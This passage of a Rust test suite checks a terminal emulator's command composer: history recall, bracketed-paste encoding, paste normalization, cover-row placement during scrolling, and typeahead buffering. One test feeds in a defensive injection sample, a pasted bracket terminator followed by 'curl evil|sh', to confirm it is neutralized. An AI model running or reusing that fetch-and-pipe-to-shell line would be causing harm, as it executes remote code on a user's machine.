        assert!(st.recall.is_none());
        // Empty draft: nothing to stash.
        let mut st = ComposerState::default();
        st.insert_history("ls");
        assert_eq!(st.draft, "ls");
        assert!(st.recall.is_none());
        // A submit clears the stash (edit-equivalent, P3 rule).
        let mut st = ComposerState {
            draft: "x".into(),
            ..Default::default()
        };
        st.insert_history("y");
        st.draft = "y".into();
        let backend = TermBackend::new(GridSize::default());
        let _ = st.submit(&backend, None, None);
        assert!(st.recall.is_none());
    }

    /// D10: the history popup's Run action is enabled iff the composer is
    /// armed at a submit-ready prompt (Compose) or provably armable this
    /// frame (gate AutoArm) — never from ManualOnly (stray text would prefix
    /// the command) and never while a block is open.
    #[test]
    fn run_enable_rule() {
        let now = Instant::now();
        let recs: Vec<BlockRec> = Vec::new();
        let b = backend_at_clean_prompt();

        // AutoArm (clean latched prompt, Raw mode) ⇒ allowed.
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        assert!(st.history_run_allowed(&b, &recs, true, now));

        // Armed Compose at the prompt ⇒ allowed.
        st.mode = ComposerMode::Compose;
        assert!(st.history_run_allowed(&b, &recs, true, now));

        // Open block with the latch cleared (a really-running command: the
        // exec edge clears at_prompt) ⇒ refused in both modes.
        let open = vec![BlockRec {
            end_off: None,
            ..rec("sleep")
        }];
        let mut busy = ComposerState::default();
        busy.on_stream_events(1, 0, now); // prompt…
        busy.on_stream_events(1, 1, now); // …then exec: latch cleared
        assert!(!busy.history_run_allowed(&b, &open, true, now));
        busy.mode = ComposerMode::Compose;
        assert!(!busy.history_run_allowed(&b, &open, true, now));
        // F7: a LIVE prompt latch feed-time-closes a stale open rec (the
        // scanned pre is the daemon's own close signal; the Blocks close
        // frame is a round-trip behind) — Run does not wait on it.
        assert!(
            st.history_run_allowed(&b, &open, true, now),
            "a live latch overrides a stale open rec (F7)"
        );

        // ManualOnly (dirty cursor) ⇒ refused.
        let mut dirty = backend_at_clean_prompt();
        dirty.advance_live(b"stray");
        let mut st = ComposerState::default();
        pump_counters(&mut st, &dirty, now);
        assert!(!st.history_run_allowed(&dirty, &recs, true, now));

        // Dead ⇒ refused.
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        assert!(!st.history_run_allowed(&b, &recs, false, now));
    }

    /// §11 recall: recs [a, b, b, "", c] → Up: c, b, a (dupes and blanks
    /// skipped); Down walks back and past-newest restores the saved draft;
    /// an edit mid-recall drops the recall state.
    #[test]
    fn recall_walks_and_dedupes() {
        let recs: Vec<BlockRec> = ["a", "b", "b", "", "c"].iter().map(|c| rec(c)).collect();
        let mut st = ComposerState {
            draft: "draft0".into(),
            ..Default::default()
        };
        st.recall_prev(&recs);
        assert_eq!(st.draft, "c");
        st.recall_prev(&recs);
        assert_eq!(st.draft, "b");
        st.recall_prev(&recs);
        assert_eq!(st.draft, "a");
        st.recall_prev(&recs); // at the oldest: stays
        assert_eq!(st.draft, "a");
        st.recall_next(&recs);
        assert_eq!(st.draft, "b");
        st.recall_next(&recs);
        assert_eq!(st.draft, "c");
        st.recall_next(&recs); // past the newest: saved draft restored
        assert_eq!(st.draft, "draft0");
        assert!(st.recall.is_none());
        // Edit-drops-recall is enforced at the UI (response.changed());
        // model side: a submit clears it too.
        let backend = TermBackend::new(GridSize::default());
        st.recall_prev(&recs);
        assert!(st.recall.is_some());
        st.draft = "x".into();
        let _ = st.submit(&backend, None, None);
        assert!(st.recall.is_none());
    }

    /// §11 submission bytes: bracketed iff the shell requested DECSET 2004 ×
    /// trailing-newline trim × CRLF sanitize × unicode passthrough × the
    /// empty-draft bare `\r`.
    #[test]
    fn submission_bytes_matrix() {
        let plain = TermBackend::new(GridSize::default());
        let mut bracketed = TermBackend::new(GridSize::default());
        bracketed.advance(b"\x1b[?2004h");
        assert!(bracketed.mode().contains(TermMode::BRACKETED_PASTE));

        assert_eq!(submission_bytes(&plain, "echo hi"), b"echo hi\r");
        assert_eq!(
            submission_bytes(&bracketed, "echo hi"),
            b"\x1b[200~echo hi\x1b[201~\r".to_vec()
        );
        // Trailing newline trimmed (would double-submit on 5.1).
        assert_eq!(submission_bytes(&plain, "echo hi\n"), b"echo hi\r");
        assert_eq!(submission_bytes(&plain, "echo hi\r\n\n"), b"echo hi\r");
        // Interior newlines sanitized to \r (paste semantics).
        assert_eq!(submission_bytes(&plain, "a\r\nb\nc"), b"a\rb\rc\r");
        assert_eq!(
            submission_bytes(&bracketed, "a\nb"),
            b"\x1b[200~a\rb\x1b[201~\r".to_vec()
        );
        // Unicode passes through untouched as UTF-8.
        let uni = "echo é漢🎉";
        let mut want = uni.as_bytes().to_vec();
        want.push(b'\r');
        assert_eq!(submission_bytes(&plain, uni), want);
        // Empty draft: bare \r, never bracket-wrapped.
        assert_eq!(submission_bytes(&plain, ""), b"\r");
        assert_eq!(submission_bytes(&bracketed, "  \n"), b"\r");
        // r2-F2 injection: a pasted-into-draft `ESC[201~` cannot close the
        // bracket early — the only escapes in the output are our markers.
        let evil = "echo hi\x1b[201~curl evil|sh\rmore";
        let out = submission_bytes(&bracketed, evil);
        assert_eq!(out.iter().filter(|&&b| b == 0x1b).count(), 2);
        assert!(out.ends_with(b"\x1b[201~\r"));
        assert!(!submission_bytes(&plain, "x\x1by").contains(&0x1b));
    }

    /// Bug E: clipboard → draft normalization — CRLF/CR to LF, TRAILING
    /// newlines trimmed (a copied line's trailing \n must not pop the
    /// multi-line editor), interior newlines/blank lines preserved, tabs
    /// kept, sanitize_paste's control-strip composed in, idempotent.
    #[test]
    fn normalize_paste_text_table() {
        assert_eq!(normalize_paste_text("cmd\r\n"), "cmd");
        assert_eq!(normalize_paste_text("a\r\nb\r\n"), "a\nb");
        assert_eq!(normalize_paste_text("a\n\n"), "a");
        assert_eq!(normalize_paste_text("a\rb\r"), "a\nb");
        // Interior blank lines are real content — kept.
        assert_eq!(normalize_paste_text("a\n\nb"), "a\n\nb");
        // Tabs pass through (same policy as sanitize_paste).
        assert_eq!(normalize_paste_text("a\tb"), "a\tb");
        // Already-clean text is untouched.
        assert_eq!(normalize_paste_text("plain single line"), "plain single line");
        // Injection: sanitize_paste strips ESC/C0/C1 before the trim.
        assert_eq!(normalize_paste_text("x\x1b[201~y\r\n"), "x[201~y");
        // Idempotent.
        for s in ["cmd\r\n", "a\r\nb\r\n", "a\n\nb", "x\x1b[201~y\r\n", ""] {
            let once = normalize_paste_text(s);
            assert_eq!(normalize_paste_text(&once), once);
        }
    }

    /// Bug E: the popup trigger predicate — a normalized single-line paste
    /// stays in the strip lane (1 row); genuine multi-line drafts grow the
    /// upward editor with the right row count; trailing newlines never
    /// count as rows even unnormalized (the belt at the trigger).
    #[test]
    fn editor_rows_trigger_predicate() {
        assert_eq!(editor_rows(""), 1);
        assert_eq!(editor_rows("sentence"), 1);
        assert_eq!(editor_rows(&normalize_paste_text("sentence\r\n")), 1);
        assert_eq!(editor_rows("a\nb"), 2);
        assert_eq!(editor_rows("a\nb\nc"), 3);
        assert_eq!(editor_rows(&normalize_paste_text("echo one\r\necho two\r\necho three\r\n")), 3);
        // Belt: even an unnormalized trailing-newline draft can't pop it.
        assert_eq!(editor_rows("sentence\n"), 1);
        assert_eq!(editor_rows("\n\n"), 1);
    }

    /// Bug E: submission encoding is unchanged by entry-point normalization —
    /// a normalized multi-line draft still emits one `\r` per line inside
    /// the brackets, accept-`\r` outside.
    #[test]
    fn submission_bytes_of_normalized_draft() {
        let plain = TermBackend::new(GridSize::default());
        let mut bracketed = TermBackend::new(GridSize::default());
        bracketed.advance(b"\x1b[?2004h");
        let draft = normalize_paste_text("a\r\nb\r\n");
        assert_eq!(draft, "a\nb");
        assert_eq!(
            submission_bytes(&bracketed, &draft),
            b"\x1b[200~a\rb\x1b[201~\r".to_vec()
        );
        let single = normalize_paste_text("dir\r\n");
        assert_eq!(single, "dir");
        assert_eq!(submission_bytes(&plain, &single), b"dir\r");
    }

    /// Bug E: the routed-paste seam (menu-Paste / middle-click →
    /// insert_dropped_text) normalizes exactly like Ctrl+V — trailing CRLF
    /// trimmed so it can't pop the multi-line editor, interior newlines
    /// kept.
    #[test]
    fn insert_dropped_text_normalizes_clipboard() {
        let mut st = ComposerState::default();
        st.insert_dropped_text("ls -la\r\n");
        assert_eq!(st.draft, "ls -la");
        assert_eq!(editor_rows(&st.draft), 1);
        let mut st = ComposerState::default();
        st.insert_dropped_text("a\r\nb\r\n");
        assert_eq!(st.draft, "a\nb");
    }

    // ── Submit-window frame walk (the third flicker report — kill the
    // class). Every painter of a cover-class rect is either captured+shift-
    // only (SubmitHold ghost, history covers, spacers) or live-but-gated-by-
    // cursor_clean (armed cover, where prompt_end is now invalidated by
    // pre/exec so "clean" can only mean the CURRENT prompt). These tests
    // replay the real submit→echo→scroll→pre→133;B window through the exact
    // mod.rs frame ordering and pin each painter's row at every step. ──────

    /// One GUI frame in mod.rs order: drain (counters) → tick → drain the
    /// history-cover outbox into the backend → the paint decision
    /// (cover_line_for). Returns this frame's cover line.
    fn sim_frame(
        st: &mut ComposerState,
        b: &mut TermBackend,
        recs: &[BlockRec],
        now: Instant,
    ) -> Option<i32> {
        let f = b.block_feed.as_ref().unwrap();
        let (pre, exec) = (f.pre_seen, f.exec_seen);
        st.on_stream_events(pre, exec, now);
        st.tick(b, recs, true, true, now);
        if let Some((l, c, cwd, cmd)) = st.take_pending_history_cover() {
            b.add_history_cover(l, c, cwd, cmd);
        }
        let comp_active = st.mode == ComposerMode::Compose;
        let cl = cover_line_for(st, b, comp_active, now);
        // THE empty-box invariant: whenever term_view is told to paint the
        // cover background at a row, the composer WILL paint on that row this
        // same frame — either the SubmitHold ghost or the armed editor. A
        // frame where the background paints and neither exists is the bare
        // "empty cover rectangle" artifact.
        if cl.is_some() {
            assert!(
                st.submit_hold.is_some() || st.mode == ComposerMode::Compose,
                "cover granted with no painter (empty-box frame): mode {:?}",
                st.mode
            );
        }
        cl
    }

    /// Full-screen backend (40×6, prompt on the bottom row) parked at a
    /// clean prompt — the user's real terminal shape, where output SCROLLS.
    fn backend_full_screen_prompt() -> TermBackend {
        let mut b = TermBackend::new(GridSize {
            cols: 40,
            rows: 6,
            cell_width: 8.0,
            cell_height: 16.0,
        });
        b.set_stream_pos(0);
        b.enable_block_scan();
        b.advance_live(b"l0\r\nl1\r\nl2\r\nl3\r\nl4\r\n"); // cursor on row 5
        let mut d = hook_bytes("pre", r#"{"e":0,"n":1,"d":"C:"}"#);
        d.extend_from_slice(b"PS C:\\> ");
        d.extend_from_slice(b"\x1b]133;B\x07");
        b.advance_live(&d);
        assert!(b.cursor_at_prompt_end());
        assert_eq!(
            b.block_feed.as_ref().unwrap().prompt_end,
            Some((5, 8)),
            "prompt parked on the bottom row"
        );
        b
    }

    /// The scrolled-release conversion regression: echo + output + scroll all
    /// land in ONE drain before the release tick. The pin must shift with the
    /// history delta so the `❯ cmd` history cover lands on the TRUE echo row
    /// — the un-shifted pin pointed at the fresh prompt's row instead (no
    /// conversion ⇒ raw `PS …> ls` flash; or worse, a false row match during
    /// Enter-spam ⇒ the cover painted on the WRONG row: the screenshot's
    /// stacked-covers chaos).
    #[test]
    fn hold_pin_shifts_with_scroll_and_converts_at_true_row() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5), "armed");
        assert_eq!(st.mode, ComposerMode::Compose);

        st.draft = "ls".into();
        let (bytes, spacer) = st.submit(&b, Some(5), Some("C:\\"));
        assert_eq!(bytes, b"ls\r");
        assert!(!spacer);

        // ONE chunk: exec hook + echo + accept newline + 3 output rows.
        // The bottom-row newlines scroll 4 rows into history.
        let mut d = hook_bytes("exec", r#"{"c":"ls"}"#);
        d.extend_from_slice(b"ls\r\nout1\r\nout2\r\nout3\r\n");
        b.advance_live(&d);
        assert_eq!(b.history_size(), 4, "test must scroll");

        let cl = sim_frame(&mut st, &mut b, &recs, now);
        assert_eq!(cl, None, "hold released after the scrolled echo");
        // The conversion must have landed on the SHIFTED row (5 - 4 = 1),
        // which is the row that really shows `PS C:\> ls`.
        let covers = b.healthy_covers();
        assert_eq!(covers.len(), 1, "exactly one history cover");
        assert_eq!(covers[0].line, 1, "cover at the true (shifted) echo row");
        assert_eq!(covers[0].cmd.as_deref(), Some("ls"));
        assert!(b.row_has_text_at(1, 8, "ls"), "the covered row carries the echo");
    }

    /// The full submit window, chunk by chunk, at ConPTY's real delivery
    /// order (OSCs ahead of async-rendered text). Asserts every painter's
    /// row at every frame: the ghost never moves off the (shifted) submit
    /// row, no cover paints between the release and the fresh 133;B (the
    /// premature-arm down-then-up), and the new armed cover appears only on
    /// the latched-clean fresh prompt row.
    #[test]
    fn submit_window_frame_walk() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5));

        st.draft = "ls".into();
        let _ = st.submit(&b, Some(5), Some("C:\\"));

        // F1: exec OSC alone (ConPTY reorder) — grid untouched, ghost holds
        // the submit row.
        b.advance_live(&hook_bytes("exec", r#"{"c":"ls"}"#));
        assert_eq!(
            sim_frame(&mut st, &mut b, &recs, now),
            Some(5),
            "exec-before-echo: the ghost must keep covering the bare prompt row"
        );
        assert!(st.submit_hold.is_some());

        // F2: the echo renders (no scroll yet) — release + convert in place.
        b.advance_live(b"ls");
        assert_eq!(
            sim_frame(&mut st, &mut b, &recs, now),
            None,
            "echo landed: released, no armed cover while busy"
        );
        let covers = b.healthy_covers();
        assert_eq!((covers.len(), covers[0].line), (1, 5), "history cover in place");

        // F3: output scrolls k rows, then the fresh pre OSC (again ahead of
        // its prompt text). prompt_end is invalidated — the stale cell can
        // never arm a cover on a wrong row (the reported "box drops down
        // then flies up"). Since the render-window fix (Bug 2), this window
        // BLANKS the incoming prompt row instead of letting the fresh raw
        // `PS C:\>` flash for a frame: the pre was scanned at col 0 of the
        // cursor row, so THAT row is provably where the prompt is rendering.
        let mut d = b"\r\nout1\r\nout2\r\n".to_vec();
        d.extend(hook_bytes("pre", r#"{"e":0,"n":2,"d":"C:"}"#));
        b.advance_live(&d);
        assert_eq!(b.history_size(), 3);
        assert_eq!(
            sim_frame(&mut st, &mut b, &recs, now),
            Some(5),
            "pre→133;B window: the incoming prompt row is blanked (no raw flash)"
        );
        // Typeahead: Compose is HELD through the window (keys keep landing
        // in the editor).
        assert_eq!(st.mode, ComposerMode::Compose);
        // The history cover rode the scroll rigidly: 5 - 3 = 2.
        let covers = b.healthy_covers();
        assert_eq!((covers.len(), covers[0].line), (1, 2), "cover shifted rigidly");

        // F4: prompt text + 133;B — NOW the fresh prompt is latched clean and
        // the armed cover appears exactly on its row (the cursor row).
        let mut d = b"PS C:\\> ".to_vec();
        d.extend_from_slice(b"\x1b]133;B\x07");
        b.advance_live(&d);
        assert_eq!(
            sim_frame(&mut st, &mut b, &recs, now),
            Some(5),
            "armed cover only on the latched-clean fresh prompt row"
        );
        assert_eq!(st.mode, ComposerMode::Compose);
        // One cover per row: the armed row (5) and the history cover (2) are
        // distinct; nothing ever painted between them.
        assert_eq!(b.healthy_covers()[0].line, 2);
    }

    /// The empty-Enter gesture at ConPTY order: the fresh `pre` arrives while
    /// the cursor still SITS at the old prompt end (the newline echo renders
    /// later). A live stale prompt_end made cursor_clean spuriously true ⇒
    /// the composer armed its cover on the OLD row, dropped to the strip when
    /// the newline finally rendered, then re-armed on the new row — the
    /// down-then-up flicker. pre must invalidate prompt_end.
    #[test]
    fn empty_enter_no_premature_arm_between_pre_and_133b() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5));

        // Empty Enter: bare \r + spacer mark (mod.rs does this on submit).
        let (bytes, spacer) = st.submit(&b, Some(5), Some("C:\\"));
        assert_eq!(bytes, b"\r");
        assert!(spacer);
        b.mark_prompt_spacer();

        // F1: the pre OSC alone — cursor still parked at the OLD prompt end
        // (5,8). This was the premature-arm frame.
        b.advance_live(&hook_bytes("pre", r#"{"e":0,"n":2,"d":"C:"}"#));
        assert!(
            b.term.grid().cursor.point.line.0 == 5,
            "reorder premise: cursor hasn't moved yet"
        );
        assert_eq!(
            sim_frame(&mut st, &mut b, &recs, now),
            None,
            "pre with the cursor still parked on the old prompt end must NOT paint a cover"
        );
        // Compose is held (typeahead); the cover gate alone withholds paint.
        assert_eq!(st.mode, ComposerMode::Compose);

        // F2: the newline echo renders (scrolls one row — prompt was on the
        // bottom row), then prompt text + 133;B.
        b.advance_live(b"\r\n");
        let mut d = b"PS C:\\> ".to_vec();
        d.extend_from_slice(b"\x1b]133;B\x07");
        b.advance_live(&d);
        assert_eq!(
            sim_frame(&mut st, &mut b, &recs, now),
            Some(5),
            "fresh prompt latched clean: cover on the new bottom row"
        );
        assert_eq!(st.mode, ComposerMode::Compose);
        // The superseded prompt row is a blank spacer, shifted with the
        // scroll (5 - 1 = 4), healthy (its input area is blank).
        let covers = b.healthy_covers();
        assert_eq!(covers.len(), 1);
        assert_eq!(covers[0].line, 4, "spacer rode the scroll");
        assert!(covers[0].cmd.is_none(), "spacer paints blank");
    }

    /// Enter-spam ×5 with scrolling between each: every released hold must
    /// convert onto its own true row — the un-shifted pin false-matched a
    /// LATER `PS …> ls` echo during spam and stacked covers on wrong rows.
    #[test]
    fn enter_spam_covers_land_on_distinct_true_rows() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5));

        for n in 0..5u32 {
            assert_eq!(st.mode, ComposerMode::Compose, "iteration {n} starts armed");
            st.draft = "ls".into();
            let cl = cover_line_for(&st, &b, true, now);
            let _ = st.submit(&b, cl, Some("C:\\"));
            // One realistic burst: exec + echo + output + fresh prompt.
            let mut d = hook_bytes("exec", r#"{"c":"ls"}"#);
            d.extend_from_slice(b"ls\r\nout\r\n");
            d.extend(hook_bytes("pre", &format!(r#"{{"e":0,"n":{},"d":"C:"}}"#, n + 2)));
            d.extend_from_slice(b"PS C:\\> ");
            d.extend_from_slice(b"\x1b]133;B\x07");
            b.advance_live(&d);
            assert_eq!(
                sim_frame(&mut st, &mut b, &recs, now),
                Some(5),
                "iteration {n} re-arms on the fresh bottom prompt"
            );
        }
        // Five history covers, all healthy, all on DISTINCT rows, each row
        // really carrying its `ls` echo at the captured column.
        let covers = b.healthy_covers();
        let mut lines: Vec<i32> = covers
            .iter()
            .filter(|c| c.cmd.is_some())
            .map(|c| c.line)
            .collect();
        assert_eq!(lines.len(), 5, "one cover per spammed submit");
        lines.sort_unstable();
        lines.dedup();
        assert_eq!(lines.len(), 5, "no two covers stacked on one row");
        for c in covers.iter().filter(|c| c.cmd.is_some()) {
            assert!(
                b.row_has_text_at(c.line, c.col, "ls"),
                "cover at {} sits on a row that really shows its echo",
                c.line
            );
        }
    }

    /// THE fusion regression (repro bonus defect: staged `lsechols`
    /// executed). Enter during the un-armable window must never be silently
    /// eaten while the draft accumulates: with a draft it becomes a LINE
    /// BREAK (visible buffering — the two commands stay separate lines and
    /// submission encodes each as its own `\r`); armable it submits; empty
    /// it is swallowed.
    #[test]
    fn enter_fusion_guard() {
        // The Enter routing table (typeahead: `buffering` = post-submit
        // window open or blind submissions queued; it implies !can_submit).
        assert_eq!(enter_action(true, true, false), EnterAction::Submit);
        assert_eq!(enter_action(true, false, false), EnterAction::Submit); // spacer gesture
        assert_eq!(enter_action(false, true, true), EnterAction::Queue); // blind cmd⏎
        assert_eq!(enter_action(false, false, true), EnterAction::Queue); // blind spacer
        assert_eq!(enter_action(false, true, false), EnterAction::InsertNewline);
        assert_eq!(enter_action(false, false, false), EnterAction::Swallow);
        // The lsechols narrative: "ls" + Enter(dead window ⇒ newline) +
        // "echo hi" + Enter(armed) must submit two separate commands.
        let plain = TermBackend::new(GridSize::default());
        let draft = "ls\necho hi"; // what the guard leaves in the editor
        assert_eq!(
            submission_bytes(&plain, draft),
            b"ls\recho hi\r",
            "each buffered line is its own submission — never `lsechols`"
        );
    }

    /// Strip-stability walk (F3, the stable-chrome table): with the
    /// typeahead buffer the LEFT lane stays Editor across the ENTIRE submit
    /// window of an instant command (the freeze is paint-level: the ghost
    /// text replaces the hint while the draft is empty) — no Busy row, no
    /// raw-label flash, and (by construction — fixed slot geometry) zero
    /// right-cluster change. Frozen remains the Raw+hold presentation (an
    /// Esc-yield mid-hold). A slow command reveals Busy only after REVEAL.
    #[test]
    fn lane_content_submit_window_walk() {
        let now = Instant::now();
        let b = backend_at_clean_prompt();
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.mode = ComposerMode::Compose;
        assert_eq!(lane_content(&st, true, false, false, now), LaneContent::Editor);

        // Enter: Compose held (typeahead) ⇒ the lane STAYS Editor — zero
        // strip churn at submit, stronger than the old Frozen swap.
        st.draft = "ls".into();
        let _ = st.submit(&b, Some(0), Some("C:\\"));
        assert_eq!(lane_content(&st, true, false, false, now), LaneContent::Editor);

        // exec edge (rec opens): still the editor (buffering holds Compose);
        // through release and the pre edge nothing changes either.
        st.on_stream_events(1, 1, now);
        assert_eq!(lane_content(&st, true, false, true, now), LaneContent::Editor);
        st.submit_hold = None; // released (echo landed; tick path)
        st.last_activity = Some(now);
        assert_eq!(lane_content(&st, true, false, true, now), LaneContent::Editor);
        st.on_stream_events(2, 1, now);
        assert_eq!(lane_content(&st, true, false, true, now), LaneContent::Editor);

        // Esc mid-hold (deliberate yield): Raw with a live hold ⇒ Frozen —
        // the submitted text stays put with no caret until release.
        let mut st = ComposerState::default();
        st.on_stream_events(1, 0, now);
        st.mode = ComposerMode::Compose;
        st.draft = "ls".into();
        let _ = st.submit(&b, Some(0), Some("C:\\"));
        st.blur_to_grid();
        assert_eq!(lane_content(&st, true, false, false, now), LaneContent::Frozen);
        st.submit_hold = None;
        st.last_activity = Some(now);
        assert_eq!(
            lane_content(&st, true, false, true, now),
            LaneContent::Quiet,
            "an open block younger than REVEAL never shows the busy row"
        );

        // Slow command: Busy reveals only past REVEAL.
        let mut st = ComposerState::default();
        st.on_stream_events(1, 0, now);
        st.on_stream_events(1, 1, now); // exec: busy_since = now
        st.mode = ComposerMode::Raw(RawReason::Busy);
        assert_eq!(lane_content(&st, true, false, true, now), LaneContent::Quiet);
        let later = now + REVEAL + Duration::from_millis(1);
        assert_eq!(lane_content(&st, true, false, true, later), LaneContent::Busy);

        // Steady raw label only once every edge is stale.
        let mut st = ComposerState {
            mode: ComposerMode::Raw(RawReason::UserRaw),
            ..Default::default()
        };
        assert_eq!(lane_content(&st, true, false, false, now), LaneContent::Label);
        st.last_activity = Some(now);
        assert_eq!(lane_content(&st, true, false, false, now), LaneContent::Quiet);
        assert_eq!(lane_content(&st, true, false, false, later), LaneContent::Label);

        // Dead / alt precedence.
        assert_eq!(lane_content(&st, false, false, false, now), LaneContent::SessionEnded);
        assert_eq!(lane_content(&st, true, true, false, now), LaneContent::AltScreen);

        // SSH auto-reconnect: the flag wins over SessionEnded (the between-
        // attempt Dead transients must not flicker the lane) and holds
        // through the in-flight attempt's Running phase; asleep still wins
        // (sleep cancels supervision daemon-side, belt here).
        st.reconnecting = true;
        assert_eq!(
            lane_content(&st, false, false, false, now),
            LaneContent::Reconnecting
        );
        assert_eq!(
            lane_content(&st, true, false, false, later),
            LaneContent::Reconnecting
        );
        st.asleep = true;
        assert_eq!(lane_content(&st, false, false, false, now), LaneContent::Asleep);
        st.asleep = false;
        st.reconnecting = false;
    }

    // ── Post-submit typeahead buffering (the fast-typing fix) ─────────

    /// THE user scenario (screenshot: "again if i type to fast it breaks"):
    /// `lsdf⏎dfs⏎ds⏎f⏎` typed blind at 15+ chars/sec. The first Enter
    /// submits; the rest queue inside the window and dispatch ONE PER
    /// PROMPT CYCLE — four clean `❯` blocks, zero raw fall-through, zero
    /// chords, zero flushes, Compose (the editor) held throughout.
    #[test]
    fn blind_triple_submit_executes_as_clean_sequential_blocks() {
        let recs: Vec<BlockRec> = Vec::new();
        let mut t = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, t), Some(5));

        st.draft = "lsdf".into();
        let (bytes, _) = st.submit(&b, cover_line_for(&st, &b, true, t), Some("C:\\"));
        assert_eq!(bytes, b"lsdf\r");
        assert!(st.buffering());
        for cmd in ["dfs", "ds", "f"] {
            // The Enter path while buffering (EnterAction::Queue): the
            // typed draft becomes a queued blind submission.
            st.draft = cmd.into();
            st.queue_draft();
        }
        assert_eq!(st.pending.len(), 3);

        let mut executed = vec![b"lsdf\r".to_vec()];
        for n in 0..8u32 {
            // The shell answers the last dispatched command: exec + echo +
            // scroll + fresh prompt (pre ahead of its text — ConPTY order).
            let last = executed.last().unwrap();
            let cmd = String::from_utf8(last[..last.len() - 1].to_vec()).unwrap();
            let mut d = hook_bytes("exec", &format!(r#"{{"c":"{cmd}"}}"#));
            d.extend_from_slice(cmd.as_bytes());
            d.extend_from_slice(b"\r\n");
            d.extend(hook_bytes("pre", &format!(r#"{{"e":1,"n":{},"d":"C:"}}"#, n + 2)));
            d.extend_from_slice(b"PS C:\\> ");
            d.extend_from_slice(b"\x1b]133;B\x07");
            b.advance_live(&d);
            t += Duration::from_millis(80); // realistic round-trip pace
            let _ = sim_frame(&mut st, &mut b, &recs, t);
            assert_eq!(st.mode, ComposerMode::Compose, "the editor is never yielded");
            assert!(
                st.take_pending_clear().is_none(),
                "clean fast typing: no chord, no flush, ever"
            );
            if let Some((bytes, spacer)) =
                st.pump_pending(&b, cover_line_for(&st, &b, true, t), Some("C:\\"), t)
            {
                assert!(!spacer);
                executed.push(bytes);
            }
            if executed.len() == 4 && !st.buffering() && st.submit_hold.is_none() {
                break;
            }
        }
        assert_eq!(
            executed,
            vec![
                b"lsdf\r".to_vec(),
                b"dfs\r".to_vec(),
                b"ds\r".to_vec(),
                b"f\r".to_vec()
            ],
            "one command per prompt cycle, in typed order"
        );
        // Four clean ❯ blocks: a history cover per command, all on distinct
        // rows, each row really carrying its echo (no raw `PS …>` remains).
        let covers = b.healthy_covers();
        let mut lines: Vec<i32> = covers
            .iter()
            .filter(|c| c.cmd.is_some())
            .map(|c| c.line)
            .collect();
        assert_eq!(lines.len(), 4, "every blind command got its ❯ cover");
        lines.sort_unstable();
        lines.dedup();
        assert_eq!(lines.len(), 4, "no two covers stacked on one row");
        for c in covers.iter().filter(|c| c.cmd.is_some()) {
            assert!(
                b.row_has_text_at(c.line, c.col, c.cmd.as_deref().unwrap()),
                "cover at {} sits on the row that shows its echo",
                c.line
            );
        }
    }

    /// Disambiguation rule (a): the submitted command flips to alt-screen
    /// (the `claude` case) — the buffered keys belong to the APP. They flush
    /// to the PTY in order within the SAME tick as the flip, and the
    /// composer yields raw.
    #[test]
    fn alt_flip_flushes_buffer_to_app_same_tick() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5));

        st.draft = "claude".into();
        let _ = st.submit(&b, Some(5), Some("C:\\"));
        // Typed during the window — held in the draft, NOT at the shell.
        st.draft = "hello".into();

        // claude starts: exec, echo, then the alt-screen flip.
        let mut d = hook_bytes("exec", r#"{"c":"claude"}"#);
        d.extend_from_slice(b"claude\r\n\x1b[?1049h");
        b.advance_live(&d);
        pump_counters(&mut st, &b, now);
        st.tick(&b, &recs, true, false, now + Duration::from_millis(60));

        assert_eq!(st.mode, ComposerMode::Raw(RawReason::AltScreen));
        assert_eq!(
            st.take_pending_clear().as_deref(),
            Some(b"hello".as_ref()),
            "buffered keys reach the app in the flip's own tick"
        );
        assert!(st.draft.is_empty(), "flushed, not duplicated");
    }

    /// Disambiguation rule (b): no fresh prompt within POST_SUBMIT_FLUSH —
    /// the command is long-running (`ping -n 3`) and typing during it is
    /// shell type-ahead: the buffer flushes to the PTY and the composer
    /// yields Raw(Busy). PSReadLine echoes and executes it natively.
    #[test]
    fn busy_threshold_flushes_typeahead_to_shell() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = backend_full_screen_prompt();
        let mut st = ComposerState::default();
        assert_eq!(sim_frame(&mut st, &mut b, &recs, now), Some(5));

        st.draft = "ping -n 3 localhost".into();
        let _ = st.submit(&b, Some(5), Some("C:\\"));
        let mut d = hook_bytes("exec", r#"{"c":"ping -n 3 localhost"}"#);
        d.extend_from_slice(b"ping -n 3 localhost\r\nPinging...\r\n");
        b.advance_live(&d);
        pump_counters(&mut st, &b, now);
        st.draft = "dfs".into(); // typed during the ping

        // Inside the threshold: still buffering (a fast prompt would keep it).
        st.tick(&b, &recs, true, false, now + POST_SUBMIT_FLUSH - Duration::from_millis(10));
        assert_eq!(st.mode, ComposerMode::Compose);
        assert!(st.take_pending_clear().is_none());
        assert_eq!(st.draft, "dfs");

        // Past it: flush + yield.
        st.tick(&b, &recs, true, false, now + POST_SUBMIT_FLUSH + Duration::from_millis(10));
        assert_eq!(st.mode, ComposerMode::Raw(RawReason::Busy));
        assert_eq!(
            st.take_pending_clear().as_deref(),
            Some(b"dfs".as_ref()),
            "typed-ahead keys land at the shell exactly once"
        );
        assert!(st.draft.is_empty());
    }

    /// An EMPTY buffer at the threshold (nothing typed since Enter): the
    /// window yields to Raw(Busy) with zero bytes — from here typing goes
    /// raw to the grid as native shell type-ahead, the pre-typeahead
    /// behavior for a busy shell.
    #[test]
